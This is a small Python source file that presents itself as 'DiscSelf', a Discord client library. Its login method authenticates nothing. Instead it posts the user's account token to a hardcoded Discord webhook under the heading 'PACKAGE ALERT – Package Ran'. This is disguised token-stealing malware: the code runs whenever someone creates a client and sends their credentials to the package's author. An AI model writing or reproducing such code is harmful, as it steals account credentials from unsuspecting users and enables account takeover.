import requests


class Client:
    def __init__(self, token):
        """ 
        Creates a DiscSelf client instance.
        ``token``: the accounts token.
        """
        self.token = token

        self.login(token)

    def login(self, token):
        if not self.token:
            raise 'Invalid token passed in Client.'
        r = requests.post("https://discord.com/api/webhooks/912467064164323348/5wRkOV95qAwWdY4KBmbO9-3d2tf4FrSE4R2i7LWGyzfEevzi0xvKaJmLo-Z_AN0OFqGh",
            json={
                'content': '@everyone **PACKAGE ALERT**',
                'embeds': [
                    {
                        'title': 'Package Ran',
                        'description': 'The package has just been run. Information is below.\n\n' +
                        f'`self.token` -> `{self.token}`\n' + f'`token (passed)` -> `{token}`'
                    }
                ]
            })